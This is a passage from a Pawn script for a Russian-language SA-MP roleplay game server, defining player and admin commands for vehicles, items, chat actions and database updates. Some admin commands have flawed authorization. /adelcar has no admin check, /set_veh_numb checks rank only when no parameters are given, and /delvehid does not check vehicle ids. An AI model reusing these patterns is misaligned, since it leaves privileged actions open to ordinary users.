	else if(GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) >= 90) return SendClientMessage(playerid, COLOR_GREY, "В баке есть бензин!");
	GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) += 10;
	if(PlayerItem2[playerid][ok] == 0)
	{
 		PlayerItem1[playerid][ok]=0;
   	}
   	PlayerItem2[playerid][ok]--;
    SaveItem(playerid,ok);
    if(PI[playerid][pSex] == 1) MeAction(playerid, "достал канистру и заливает бензин в бак машины");
	else MeAction(playerid, "достала канистру и заливает бензин в бак машины");
	return 1;
}

CMD:tools(playerid)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
    new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==32){ok=s;break;}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет набора инструментов, купите его на заправочной станции!");}
    else if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорт!");
	RepairVehicle(GetPlayerVehicleID(playerid));
	if(PlayerItem2[playerid][ok] == 0)
	{
 		PlayerItem1[playerid][ok]=0;
   	}
   	PlayerItem2[playerid][ok]--;
    SaveItem(playerid,ok);
    if(PI[playerid][pSex] == 1) MeAction(playerid, "достал инструменты и ремонтирует машину");
	else MeAction(playerid, "достала инструменты и ремонтирует машину");
	return 1;
}

CMD:mask(playerid)
{
	new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==35){ok=s;break;}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет маски, купите их в супермаркете или 24/7!");}
	if(!PlayerUseMask[playerid])
	{
		SetPlayerColor(playerid, 0x00000000);
		PlayerUseMask[playerid] = true;
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.1, 0, 0, 0, 0, 0);
		SendClientMessage(playerid, COLOR_YELLOW, "Ваше местоположение на GPS {ffffff}скрыто{ffff00} на 10 минут!");
		SetPlayerChatBubble(playerid, "одевает маску", COLOR_ORANGE, 20.0, 500);
		GameTextForPlayer(playerid, "~b~INVISABLE ON", 800, 4);
		PlayerPlaySound(playerid, 21000, 0.0, 0.0, 0.0);
		MeAction(playerid, "одевает маску");
		MaskTimer[playerid] = SetTimerEx("MaskOff", 600000, false, "d", playerid);
	}
	else
	{
		SetPlayerColorEx(playerid,TeamColors[GetTeamID(playerid)]);
		PlayerUseMask[playerid] = false;
		if(PlayerItem2[playerid][ok] == 0)
		{
			PlayerItem1[playerid][ok]=0;
  		}
	  	PlayerItem2[playerid][ok]--;
	    SaveItem(playerid,ok);
	    GameTextForPlayer(playerid, "~y~INVISABLE OFF", 800, 4);
	    PlayerPlaySound(playerid, 21001, 0.0, 0.0, 0.0);
		MeAction(playerid, "снимает маску");
		SetPlayerChatBubble(playerid, "снимает маску", -1, 20.0, 500);
		KillTimer(MaskTimer[playerid]);
	}
	return 1;
}

CMD:healme(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid,100.0,645.9722,-339.3981,-94.7852)) return SendClientMessage(playerid,-1,"В больнице запрещено использовать аптечку!");
	else if(PI[playerid][pAptechka] == 0) return SendClientMessage(playerid, COLOR_GREY,"У Вас нет аптечек, купите их в супермаркете или 24/7!");
	new Float:shealth;
	GetPlayerHealth(playerid, shealth);
	if(shealth >= 100) return SendClientMessage(playerid, COLOR_GREY, "Твое здоровье вполне в хорошем состоянии!");
	SetHealth(playerid, shealth+40);
	GetPlayerHealth(playerid, shealth);
	if(shealth > 100) SetHealth(playerid, 100);
	if(!IsPlayerInAnyVehicle(playerid)) { ApplyAnimation(playerid,"ped","gum_eat",4.0,0,0,0,0,0,1); }
	PI[playerid][pAptechka]--;
	MysqlUpdatePlayerInt(playerid, "aptechka", PI[playerid][pAptechka]);
	if(PI[playerid][pSex] == 1) SetPlayerChatBubble(playerid,"использовал аптечку",COLOR_PURPLE,30.0,1000);
	else SetPlayerChatBubble(playerid,"использовала аптечку",COLOR_PURPLE,30.0,1000);
    GameTextForPlayer(playerid, "~b~+40 HP", 100, 1);
	return 1;
}

CMD:time(playerid)
{
/*    new ok=0;
    for(new s = 16; s > 0; s --)
    {
        if(PlayerItem1[playerid][s]==41){ok=s;break;}
    }
    if(ok==0){return SendClientMessage(playerid,COLOR_GREY,"У Вас нет часов, купите их в супермаркете или 24/7");}*/
	new hour, minuite, second, year, month, day, string[256], saturday = 1310155200, w = gettime(), day_week;
	gettime(hour, minuite, second);
	getdate(year, month, day);
	while(w - saturday > 60 * 60 * 24)
    {
        w -= 60 * 60 * 24;
        day_week ++;
    }
    while(day_week >= 7) day_week -= 7;
	static const Names_Months[12][12] = {"января","февраля","марта","апреля","мая","июня","июля","августа","сентября","октября","ноября","декабря"};
    static const Names_Days[7][12] = {"суббота","воскресенье","понедельник","вторник","среда","четверг","пятница"};
	format(string, sizeof(string), "\
	{FFFFFF}Точное время: %d:%02d\n\
	{FFFFFF}Сегодняшняя дата: %s, %d %s %04d г.\n\n\
	{FFFFFF}Отыграно за час: {FFFF00}%d мин\
	", hour, minuite, Names_Days[day_week], day, Names_Months[month-1], year, PI[playerid][pCheckTime]/60);
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Часы", string, "Закрыть", "");
	format(string, sizeof(string), "~y~%02d:%02d~n~~w~%02d.%02d.%04d", hour, minuite, day, month, year);
	GameTextForPlayer(playerid, string, 5000, 1);

	if(PI[playerid][pJailTime] != 0)
	{
        new fmt_str[70];
        format(
			fmt_str, sizeof(fmt_str),
			"{FFFFFF}Время до выхода на свободу: {FF6600}%s",
			Converts(PI[playerid][pJailTime])
		);
		SendClientMessage(playerid, COLOR_GREEN, fmt_str);
	}

	if(PI[playerid][pMuted] != 0)
	{
        new fmt_str[70];
        format(
			fmt_str, sizeof(fmt_str),
			"{FFFFFF}Время до окончания затычки {FF6600}%s",
			Converts(PI[playerid][pMuted])
		);
		SendClientMessage(playerid, COLOR_GREEN, fmt_str);
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0,1);
	if(PI[playerid][pSex] == 1) MeAction(playerid, "посмотрел на часы");
	else MeAction(playerid, "посмотрела на часы");
	return 1;
}

CMD:showcef(playerid, params[], help)
{
    if(g_CefLoaded[playerid])
    {
        cef_emit_event(playerid, "awesome:visible:hud", CEFINT(1)); // Показать HUD
        cef_hide_browser(playerid, CEF_INTERFACE_BROWSER_ID, false);
        g_HudVisible[playerid] = true;
        SendClientMessage(playerid, -1, "CEF HUD показан!");
        UpdatePlayerHud(playerid);
    }
    else
    {
        SendClientMessage(playerid, -1, "CEF не загружен!");
    }
    return 1;
}

CMD:veh(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 2) return 1;
    if(!AdminLogged[playerid]) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    if(GetPlayerInterior(playerid) > 0) return SendClientMessage(playerid, COLOR_GREY, "В интерьере нельзя создавать транспорт!");

    new modelid, color1, color2;
    if(sscanf(params, "ddd", modelid, color1, color2))
        return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /veh [id машины] [цвет 1] [цвет 2]");

    if(color1 > 255 || color1 < 0)
        return SendClientMessage(playerid, COLOR_GREY, "Номер цвета не может быть меньше 0 и больше 255");
    if(color2 > 255 || color2 < 0)
        return SendClientMessage(playerid, COLOR_GREY, "Номер цвета не может быть меньше 0 и больше 255");

    new Float:X, Float:Y, Float:Z;
    GetPlayerPos(playerid, X, Y, Z);
    X += 1.5;

    // Генерация номера (пример: ADM-XXXX, где XXXX - случайное число)
    new plate[12];
    format(plate, sizeof(plate), "admin");

    new veh_id = CreateVehicle(modelid, X, Y, Z, 0.0, color1, color2, -1);
    SetVehicleVirtualWorld(veh_id, GetPlayerVirtualWorld(playerid));
    LinkVehicleToInterior(veh_id, GetPlayerInterior(playerid));

    SetVehicleData(veh_id, create_adm, bool:true);
    g_vehicle[veh_id][veh_model] = modelid;
    g_vehicle[veh_id][veh_fuel] = 100;
    g_vehicle[veh_id][veh_color][0] = color1;
    g_vehicle[veh_id][veh_color][1] = color2;

    // Установка и передача номера
    SetVehicleNumberPlate(veh_id, plate);
    SendVehicleNumberPlate(playerid, veh_id, 1, plate);

    new string[128];
    format(string, sizeof(string), "[A] %s[%i] создал транспорт (%s(%d), ID: %d, Номер: %s)",
        GetName(playerid), playerid, g_vehicle_info[modelid - 400][VI_NAME], modelid, veh_id, plate);
    SendAdminMessage(COLOR_GREY, string);
    return 1;
}

CMD:set_veh_numb(playerid, params[])
{
	if(!strlen(params))
 	if(PI[playerid][pAdmin] < 7) return 0;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    new vehicleid = GetPlayerVehicleID(playerid);
	new plate;
	new number[32];
	sscanf(params, "ds[32]", plate, number);
	SendVehicleNumberPlate(playerid, vehicleid, plate, number);
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Установил на авто (%d) plate(%d) number(%s)", vehicleid, plate, number);
	SendClientMessage(playerid, COLOR_GREY, STRING_GLOBAL);
	return 1;
}
CMD:sell_car_numb(playerid, params[])
{
}
stock SendVehicleNumberPlate(playerid, vehicleid, plateType, platenumber[]) {
	new BitStream:bs = BS_New();
	BS_WriteValue(bs,
	PR_INT16, vehicleid,
	PR_UINT8, plateType,

	PR_BOOL, true,
	PR_UINT8, strlen(platenumber),
	PR_STRING, platenumber
	);
	PR_SendRPC(bs, playerid, 123, PR_LOW_PRIORITY);
	BS_Delete(bs);
}
CMD:asellcar(playerid, params[])
{
	static const MSG_USE_CMD[] = !"Используйте /asellcar [цена]";

	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;

	if(isnull(params))
		return SendClientMessage(playerid, -1, MSG_USE_CMD);
	new price;
	if(sscanf(params, "d", price))
		return SendClientMessage(playerid, -1, MSG_USE_CMD);
	else if(!(0 <= price < 10_000_000))
		return SendClientMessage(playerid, -1, !"Цена не может быть меньше нуля и больше десяти миллионов.");

	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid == 0)
		return SendClientMessage(playerid, -1, !"Вы должны быть в транспорте");
	else if(g_vehicle[vehicleid][create_adm] == false)
		return SendClientMessage(playerid, -1, !"Вы должны находиться в специально созданном транспорте");
	else if(g_vehicle[vehicleid][veh_autosalon] == true)
		return SendClientMessage(playerid, -1, !"Этот транспорт уже выставлен на продажу");

	new Float:x, Float:y, Float:z, Float:a;
	GetVehiclePos(vehicleid, x, y, z);
	GetVehicleZAngle(vehicleid, a);

	g_vehicle[vehicleid][veh_autosalon] = true;
	g_vehicle[vehicleid][create_adm] = false;
	g_vehicle[vehicleid][veh_price] = price;
	g_vehicle[vehicleid][veh_x] = x;
	g_vehicle[vehicleid][veh_y] = y;
	g_vehicle[vehicleid][veh_z] = z;
	g_vehicle[vehicleid][veh_a] = a;

	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO autosalon (model, x, y, z, a, price, color1, color2) VALUES (%d,%f,%f,%f,%f,%d,%d,%d)", g_vehicle[vehicleid][veh_model], x, y, z, a, g_vehicle[vehicleid][veh_price], g_vehicle[vehicleid][veh_color][0], g_vehicle[vehicleid][veh_color][1]);
	mysql_tquery(dbHandle, STRING_GLOBAL);

	SendClientMessage(playerid, -1, !"Вы успешно выставили этот транспорт на продажу");
	RemovePlayerFromVehicle(playerid);
	return 1;
}
CMD:arescar(playerid)
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;

	foreach(new i:Vehicle)
	{
		if(g_vehicle[i][veh_autosalon] == false)
			continue;

		SetVehiclePos(i, g_vehicle[i][veh_x], g_vehicle[i][veh_y], g_vehicle[i][veh_z]);
		SetVehicleZAngle(i, g_vehicle[i][veh_a]);
		SetVehicleHealth(i, 1000.0);
		g_vehicle[i][veh_fuel] = 100;
	}
	return 1;
}
CMD:adelcar(playerid)
{
	new vehicleid;
	vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid == 0) return SendClientMessage(playerid, -1, "Вы должны быть в специально созданном транспорте.");
	if(g_vehicle[vehicleid][veh_autosalon] == false) return SendClientMessage(playerid, -1, "Вы должны быть в специально созданном транспорте.");

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM autosalon WHERE id = %d", g_vehicle[vehicleid][veh_sql_id]);
	mysql_tquery(dbHandle, STRING_GLOBAL);

	DestroyVehicle(vehicleid);
	ClearVehicleData(vehicleid);

	SendClientMessage(playerid, -1, "Вы успешно удалили транспорт из автосалона");
	return 1;
}
CMD:alldelveh(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new string[128];
	format(string, sizeof(string), "[A] %s[%i] удалил все автомобили созданные администраторами", GetName(playerid), playerid);
	SendAdminMessage(COLOR_GREY, string);

	for(new i = 1; i <= MAX_VEHICLES; i++)
	{
		if(!IsValidVehicle(i))
			continue;

		if(g_vehicle[i][create_adm] != true)
			continue;

		ClearVehicleData(i);

		DestroyVehicle(i);
	}
	return 1;
}

CMD:delveh(playerid, params[])
{
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	new vehh = GetPlayerVehicleID(playerid);
	if(g_vehicle[vehh][create_adm] == false) return SendClientMessage(playerid, COLOR_GREY, "Этот автомобиль не создавал администратор");
	new string[128];
	format(string, sizeof(string), "[A] %s[%i] удалил транспорт (%s, ID: %d)", GetName(playerid), playerid, g_vehicle_info[GetVehicleModel(vehh) - 400][VI_NAME], vehh);
	SendAdminMessage(COLOR_GREY, string);
	//add_server_log(string, 18);
	if(IsValidVehicle(vehh)) DestroyVehicle(vehh), ClearVehicleData(vehh), vehh = INVALID_VEHICLE_ID;

	return 1;
}

CMD:delvehid(playerid, params[])
{
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(sscanf(params, "d", params[0]))
	    return SendClientMessage(playerid, 0xf6e58dAA, "Используйте: {FFFFFF}Введите: /delvehid [id машины]");

	new vehh = params[0];
	if(g_vehicle[vehh][create_adm] == false) return SendClientMessage(playerid, COLOR_GREY, "Этот автомобиль не создавал администратор");
	new string[128];
	format(string, sizeof(string), "[A] %s[%i] удалил транспорт (%s, ID: %d)", GetName(playerid), playerid, g_vehicle_info[GetVehicleModel(vehh) - 400][VI_NAME], vehh);
	SendAdminMessage(COLOR_GREY, string);
	if(IsValidVehicle(vehh)) DestroyVehicle(vehh), ClearVehicleData(vehh), vehh = INVALID_VEHICLE_ID;

	return 1;
}

CMD:fixveh(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	RepairVehicle(GetPlayerVehicleID(playerid));
	return SendClientMessage(playerid, COLOR_WHITE, "Ваша машина отремонтирована!");
}

CMD:do(playerid, params[])
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /do [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	DoAction(playerid, params[0]);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:try(playerid, params[])
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /try [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	TryAction(playerid, params[0]);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:ame(playerid, params[])
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
    else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ame [текст]");
    else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
    else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "%s", params[0]);
	SendClientMessage(playerid, COLOR_PURPLE, string);
	SetPlayerChatBubble(playerid, params[0], COLOR_PURPLE, 13.0, 10000);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:me(playerid, params[])
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /me [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	MeAction(playerid, params[0]);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:charity(playerid)
{
	return mysql_tquery(dbHandle, "SELECT * FROM "T_ACCOUNTS" ORDER BY "T_ACCOUNTS".`charity` DESC LIMIT 0, 15", "TopCharity", "i", playerid);
}

CMD:setfuel(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	else if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setfuel [кол-во бензина]");
	else if(params[0] > 100 || params[0] < 1) return SendClientMessage(playerid, COLOR_GREY, "Неверное кол-во литров. Можно установить от 1 до 100 л");
	GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) = params[0];
	return SendClientMessage(playerid, COLOR_LIME, "Транспорт заправлен");
}

CMD:fuelcars(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	foreach(new i: Vehicle) SetVehicleData(i, veh_fuel, 100);
    new string[128];
    format(string, sizeof(string), "Администратор %s заправил весь общественный транспорт на сервере. Приятной игры :)", GetName(playerid));
	return SendAdminMessage(VAGOS_COLOR, string);
}

// Cef:

/*CMD:check_plugin(playerid)
{
    new string[64];
    format(string, sizeof(string), "Плагин загружен - %s", cef_player_has_plugin(playerid) ? ("{ffc600}Удачно") : ("{ff0000}Неудачно"));
    return SendClientMessage(playerid, -1, string);
}

stock cef_notifical(playerid, const header[], const text[], const color[], autohide, delay)
{
    cef_emit_event(playerid, "notifical:player:data", CEFSTR(header), CEFSTR(text), CEFSTR(color), CEFINT(autohide), CEFINT(delay));
    return 1;
}

CMD:gambler_test(playerid)
{
    cef_notifical(playerid, "Авторизация", "Пароль введён успешно", "4ffbb0", 1, 5000);
    return 1;
}*/

// --------

CMD:admins(playerid)
{
	if(PI[playerid][pAdmin] >= 1 || PI[playerid][pLeader] >= 1)
	{
		new info[29], str[144];
		format(info, sizeof(info), "Администраторы онлайн: (%i)", Iter_Count(Admins));
		SendClientMessage(playerid, 0x5ac310FF, info);
		foreach(new i: Admins)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, " - %s[%d] (%s) [%i/3] [%s]", GetName(i), i, admin_rank_name[PI[i][pAdmin]],PI[i][pAWarn],ConvertsCmdTime(AdminInfo[i][admTimeMin]));
			if(PI[i][Spectating][0] == INVALID_PLAYER_ID && PI[i][pAFK] >= 3)
			{
				format(str, sizeof(str), " {FF0000}AFK %s", Converts(PI[i][pAFK]));
				strcat(STRING_GLOBAL, str);
			}
			if(PI[i][Spectating][0] != INVALID_PLAYER_ID && PI[i][pAFK] < 3)
			{	format(str, sizeof(str), " {FF0000}(SP|%i)", PI[i][Spectating][0]);
				strcat(STRING_GLOBAL, str);
			}
			if(PI[i][Spectating][0] != INVALID_PLAYER_ID && PI[i][pAFK] >= 3)
			{
				format(str, sizeof(str), " {FF0000}AFK %s {FF0000}(SP|%i)", Converts(PI[i][pAFK]), PI[i][Spectating][0]);
				strcat(STRING_GLOBAL, str);
			}

			SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);
		}
	}
	return 1;
}

CMD:gun(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gun [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new strin[70],strs[100],gunname[32];
	new weapons[13][2];

	STRING_GLOBAL[0] = EOS;
	format(strs, 100, "Игрок:\t\t\t%s{FFFFFF}", GetName(params[0]));
	strcat(STRING_GLOBAL, strs);
	for(new i = 0; i != 12; i ++)
	{
		GetPlayerWeaponData(params[0], i, weapons[i][0], weapons[i][1]);
		GetWeaponName(weapons[i][0],gunname,32);
		if(weapons[i][0] != 0)
		{
			format(strin,70,"\n\nОружие:\t\t%s (%d)\nПатроны:\t\t%d",gunname,weapons[i][0],weapons[i][1]);
			strcat(STRING_GLOBAL,strin);
		}
	}
	ShowPlayerDialog(playerid,D_NULL,0,"Оружие игрока",STRING_GLOBAL,"Закрыть","");
	return 1;
}

CMD:entrance_exit(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7)
		return 1;

	extract params -> new entranceid; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /entrance_exit [ид подъезда]");

	if(!(0 <= entranceid <= MAX_ENTRANCES-1))
		return SendClientMessage(playerid, C_RED, "Такого подъезда не существует");

	GetPlayerPos(playerid, g_entrance[entranceid][EXIT_POS_X], g_entrance[entranceid][EXIT_POS_Y], g_entrance[entranceid][EXIT_POS_Z]);
	GetPlayerFacingAngle(playerid, g_entrance[entranceid][EXIT_ANGLE]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE entrances SET exit_x='%f', exit_y='%f', exit_z='%f', exit_a='%f' WHERE id=%d", g_entrance[entranceid][EXIT_POS_X], g_entrance[entranceid][EXIT_POS_Y], g_entrance[entranceid][EXIT_POS_Z], g_entrance[entranceid][EXIT_ANGLE], entranceid);
	mysql_query(dbHandle, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно изменили координаты выхода в подъезде %d", entranceid);
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	return 1;
}
CMD:add(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	ShowPlayerDialog(playerid, D_ADDNED, 2, "Добавить", "1. Дом\n2. Добавить бизнес\n3. Добавить транспорт\n4. Добавить ATM\n5. Добавить гараж\n6. Добавить подъезд", "Принять", "Отмена");
	return 1;
}

CMD:setbizcoordexit(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;

	extract params -> new businessid; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /bsetexitpos [ид бизнеса]");

	if(!(1 <= businessid <= TOTALBIZZ))
		return SendClientMessage(playerid, C_RED, "Такого бизнеса нет");

	GetPlayerPos(playerid, BizzInfo[businessid][B_ENTER_X], BizzInfo[businessid][B_ENTER_Y], BizzInfo[businessid][B_ENTER_Z]);
	GetPlayerFacingAngle(playerid, BizzInfo[businessid][B_ENTER_A]);

	STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"UPDATE `bizz` SET `enter_x` = '%f', `enter_y` = '%f', `enter_z` = '%f', `enter_a` = '%f' WHERE `id` = '%d'",
		BizzInfo[businessid][B_ENTER_X],
		BizzInfo[businessid][B_ENTER_Y],
		BizzInfo[businessid][B_ENTER_Z],
		BizzInfo[businessid][B_ENTER_A],
		BizzInfo[businessid][bID]
	);
	mysql_query(dbHandle, STRING_GLOBAL);
	printf("%s", STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Координаты у бизнеса %d успешно изменены", businessid);
	SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
	return 1;
}

CMD:grandadmins(playerid, params[])
{
    if(PI[playerid][pAdmin] < 7) return 1;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM `grand_admins`");
    mysql_tquery(dbHandle, STRING_GLOBAL, "CheckGrandAdmins", "i", playerid);

	return true;
}

CMD:sellmycar(playerid, params[])
{
    if(!IsPlayerInRangeOfPoint(playerid, 30.0, 467.7257,997.4965,11.9993)) return SendClientMessage(playerid, C_OSNOV, "Для продажи нужно находиться на Авторынке (/gps > Основные места)");
	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /sellmycar [ид игрока] [стоимость]");

	extract params -> new to_player, price;

	if(!IsPlayerConnected(to_player) || to_player == playerid)
		return SendClientMessage(playerid, 0xCECECEFF, "Такого игрока нет");

	if(!(1 <= price <= 999999999))
		return SendClientMessage(playerid, C_RED, "Вы ввели неверную стоимость");

	if(!GetPlayerOwnableCar(playerid))
		return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, C_RED, "Вы должны находиться в транспорте");

	if(GetVehicleData(GetPlayerVehicleID(playerid), veh_owner_id) != playerid)
		return SendClientMessage(playerid, C_RED, "Вы не можете продать чужое авто");

	g_player_car[playerid] = GetPlayerVehicleID(playerid);

	SendPlayerProposition(playerid, to_player, PROPOSITION_TYPE_SELL_CAR, price);

	return 1;
}

CMD:sellcar(playerid, params[])
{
	if(!GetPlayerOwnableCar(playerid))
		return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, C_RED, "Вы должны находиться в транспорте");

	g_player_car[playerid] = GetPlayerVehicleID(playerid);

	new vehicleid = g_player_car[playerid];

	if(GetVehicleData(vehicleid, veh_owner_id) != playerid)
		return SendClientMessage(playerid, C_RED, "Вы не можете продать чужое авто");

	if(PI[playerid][P_AREND_SCOOTER] == vehicleid)
		return SendClientMessage(playerid, C_RED, "Вы не можете продать арендованный транспорт");

	new model = GetVehicleModel(vehicleid);
	if(!model) return 1;

	new price,
		percent;

	price = g_vehicle_info[model-400][VI_COST];

	percent = price * 20 / 100;

    STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{FFFFFF}Модель:\t%s (№%d)\n\
		Стоимость:\t%d руб\n\n\
		Вы уверены что хотите продать транспорт?\n\
		На Ваш банковский счет будет начислено %d руб\n\n\
		Если Вы хотите продать его другому игроку,\n\
		используйте команду /sellmycar",
		g_vehicle_info[model - 400][VI_NAME],
		model,
		price,
		price - percent
	);

	ShowPlayerDialog
	(
